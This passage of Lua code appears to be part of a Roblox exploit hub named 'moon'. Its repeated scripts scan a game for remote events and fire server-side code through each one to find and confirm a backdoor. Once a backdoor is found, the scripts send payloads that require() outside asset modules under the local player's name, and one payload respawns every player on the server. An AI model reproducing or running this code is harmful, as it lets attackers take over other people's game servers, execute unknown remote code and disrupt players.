		local payloading = [[require(6608656220):John(']] .. player.Name .. [[')]]
		pcall(function()
			if isFunction then
				task.spawn(function()
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(payloading) end)
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(payloading) end)
			end
		end)


		return testId
	end

	local function simpleFindRemote()
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0

		local candidates = {}
		local initialScanStart = os.clock()

		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("🌙 moon: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))

		local testStartTime = os.clock()

		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end

			local timeoutDuration = 0.5
			local checkInterval = 0.01
			local elapsed = 0

			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval

				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]

					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("🌙 moon: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end

		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("🌙 moon: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end

		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end
	if script.Parent:IsA("TextButton") or script.Parent:IsA("ImageButton") then
		script.Parent.MouseButton1Click:Connect(function()
			task.spawn(simpleFindRemote)
		end)
	else

		print("🌙 moon: Running initial backdoor scan...")
		task.spawn(simpleFindRemote)
	end
end;
task.spawn(C_88);
-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
local function C_92()
	local script = G2L["92"];
	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}

	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}

	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end

		if EXCLUDED_REMOTES[remote.Name] then return false end

		return true
	end

	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()

	local function testRemote(remote, isFunction)

		if foundExploit then return false end

		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)

		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}

		local player = game.Players.LocalPlayer
		local payloading = [[require(7804327506).amigodogodenot123(']] .. player.Name .. [[')]]
		pcall(function()
			if isFunction then
				task.spawn(function()
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(payloading) end)
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(payloading) end)
			end
		end)


		return testId
	end

	local function simpleFindRemote()
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0

		local candidates = {}
		local initialScanStart = os.clock()

		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("🌙 moon: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))

		local testStartTime = os.clock()

		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end

			local timeoutDuration = 0.5
			local checkInterval = 0.01
			local elapsed = 0

			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval

				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]

					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("🌙 moon: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end

		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("🌙 moon: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end

		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end
	if script.Parent:IsA("TextButton") or script.Parent:IsA("ImageButton") then
		script.Parent.MouseButton1Click:Connect(function()
			task.spawn(simpleFindRemote)
		end)
	else

		print("🌙 moon: Running initial backdoor scan...")
		task.spawn(simpleFindRemote)
	end
end;
task.spawn(C_92);
-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
local function C_9c()
	local script = G2L["9c"];
	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}

	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}

	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end

		if EXCLUDED_REMOTES[remote.Name] then return false end

		return true
	end

	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()

	local function testRemote(remote, isFunction)

		if foundExploit then return false end

		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)

		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}

		local player = game.Players.LocalPlayer
		local payloading = [[require(7163976217).VK(']] .. player.Name .. [[')]]
		pcall(function()
			if isFunction then
				task.spawn(function()
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(payloading) end)
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(payloading) end)
			end
		end)


		return testId
	end

	local function simpleFindRemote()
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0

		local candidates = {}
		local initialScanStart = os.clock()

		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("🌙 moon: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))

		local testStartTime = os.clock()

		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end

			local timeoutDuration = 0.5
			local checkInterval = 0.01
			local elapsed = 0

			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval

				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]

					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("🌙 moon: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end

		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("🌙 moon: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end

		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end
	if script.Parent:IsA("TextButton") or script.Parent:IsA("ImageButton") then
		script.Parent.MouseButton1Click:Connect(function()
			task.spawn(simpleFindRemote)
		end)
	else

		print("🌙 moon: Running initial backdoor scan...")
		task.spawn(simpleFindRemote)
	end
end;
task.spawn(C_9c);
-- StarterGui.ScreenGui.Hub.RE.LocalScript
local function C_ab()
	local script = G2L["ab"];
	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}

	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}

	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end

		if EXCLUDED_REMOTES[remote.Name] then return false end

		return true
	end

	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()

	local function testRemote(remote, isFunction)

		if foundExploit then return false end

		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)

		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}



		local player = game.Players.LocalPlayer
		local payloading = [[
		for _, lol in pairs(game.Players:GetPlayers()) do
			lol:LoadCharacter()
		end
		]]
		pcall(function()
			if isFunction then
				task.spawn(function()
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(payloading) end)
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(payloading) end)
			end
		end)


		return testId
	end

	local function simpleFindRemote()
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0

		local candidates = {}
		local initialScanStart = os.clock()

		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("🌙 moon: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))

		local testStartTime = os.clock()

		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end

			local timeoutDuration = 0.5
			local checkInterval = 0.01
			local elapsed = 0

			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval

				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]

					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("🌙 moon: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end

		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("🌙 moon: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end

		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end
	if script.Parent:IsA("TextButton") or script.Parent:IsA("ImageButton") then
		script.Parent.MouseButton1Click:Connect(function()
			task.spawn(simpleFindRemote)
		end)
	else

		print("🌙 moon: Running initial backdoor scan...")
		task.spawn(simpleFindRemote)
	end
end;
task.spawn(C_ab);

return G2L["1"], require;
